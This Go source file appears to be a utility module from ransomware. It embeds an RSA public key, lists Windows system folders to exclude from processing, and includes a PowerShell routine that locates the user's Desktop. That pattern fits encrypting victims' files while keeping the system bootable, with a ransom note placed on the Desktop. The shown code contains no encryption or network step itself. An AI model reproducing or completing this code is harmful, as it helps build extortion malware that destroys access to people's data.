package utils

import (
	"bytes"
	"io/ioutil"
	"os/exec"

	"golang.org/x/text/encoding/charmap"
)

var (
	SPubKeyPem = []byte(`-----BEGIN RSA PUBLIC KEY-----
MIIBCgKCAQEAypl+4F/OxQCBJXPVXa//VmoON8hqaSJ15XDccriExWFHOF31kxCG
45+BHaVwACasxe5MpdMz30Jd+iHZTnnNbPcL82HqIvGsD4cKWGGOxc6sLfa3fYVr
kOiOKQ/HUUSCMv761R+6iIGhfztrYM8/hGHKLWGrXqSUCvRveaW7n1HzKb9eEfys
sojwrz3dFhVN1o/fFxbBWYGmmGqXG6mKMLk+CVAA3pEwzNvJs+dgJ4IJSvF6FcHV
ti6w2Y9SEWlU7nAZVAAvX2WbpXZ6VdPYiu1jQY437WwG712YjlM5EL/rdJMi/rZP
M4xhymCo9feLsRCkNgAAQKgK73UsM5hrPwIDAQAB
-----END RSA PUBLIC KEY-----	
`)

	FoldersToSkip = []string{
		"Nova pasta",
		"ProgramData",
		"Windows",
		"bootmgr",
		"$WINDOWS.~BT",
		"Windows.old",
		"Temp",
		"tmp",
		"Program Files",
		"Program Files (x86)",
		"AppData",
		"$Recycle.Bin",
	}
)

func Contains[T comparable](s []T, e T) bool {
	for _, v := range s {
		if v == e {
			return true
		}
	}
	return false
}

func decodePage850(msg []byte) (string, error) {

	reader := charmap.CodePage850.NewDecoder().Reader(bytes.NewReader(msg))

	bytesDecoded, err := ioutil.ReadAll(reader)
	if err != nil {
		return "", err
	}

	return string(bytesDecoded), nil
}

func GetDesktopPath() (string, error) {
	pathBytes, err := exec.Command("Powershell", `[Environment]::GetFolderPath("Desktop")`).Output()
	if err != nil {
		return "", err
	}

	desktopPath, err := decodePage850(pathBytes)
	if err != nil {
		return "", err
	}

	n := len(desktopPath)
	desktopPath = desktopPath[0 : n-2]

	return desktopPath, nil
}
